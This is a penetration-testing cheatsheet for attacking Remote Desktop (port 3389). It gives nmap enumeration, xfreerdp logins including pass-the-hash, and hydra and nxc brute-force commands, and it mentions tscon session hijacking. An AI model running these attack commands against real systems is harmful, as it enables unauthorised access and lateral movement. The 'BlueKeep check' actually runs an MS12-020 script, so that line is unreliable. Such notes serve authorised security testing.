# RDP (3389)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Remote Desktop. High-value target. **BlueKeep (CVE-2019-0708)** is still unpatched on some forgotten systems. **Pass-the-Hash works with Restricted Admin mode**. Check for NLA disabled — allows pre-auth exploits and screenshot grab. RDP credentials often = local admin = lateral. Session hijacking via `tscon` from a SYSTEM shell hijacks any disconnected user session without their password. **Common attack vectors:** BlueKeep, DejaBlue, Pass-the-Hash (Restricted Admin), brute force, session hijacking (tscon from SYSTEM), credential capture via rogue RDP proxy (PyRDP).

## Enumerate

```bash
nmap -sV -sC -p 3389 $IP
nmap --script rdp-ntlm-info -p 3389 $IP
nmap --script rdp-enum-encryption -p 3389 $IP
```

## Connect

```bash
xfreerdp /v:$IP /u:user /p:'password' /cert:ignore
xfreerdp /v:$IP /u:user /p:'password' /d:DOMAIN /cert:ignore

# Pass-the-hash (restricted admin mode)
xfreerdp /v:$IP /u:admin /pth:NTHASH /cert:ignore

# Dynamic resolution
xfreerdp /v:$IP /u:user /p:'pass' /dynamic-resolution /cert:ignore
```

## Brute-force

```bash
hydra -l admin -P passwords.txt rdp://$IP -V
nxc rdp $IP -u users.txt -p passwords.txt
```

## BlueKeep check

```bash
nmap --script rdp-vuln-ms12-020 -p 3389 $IP
```
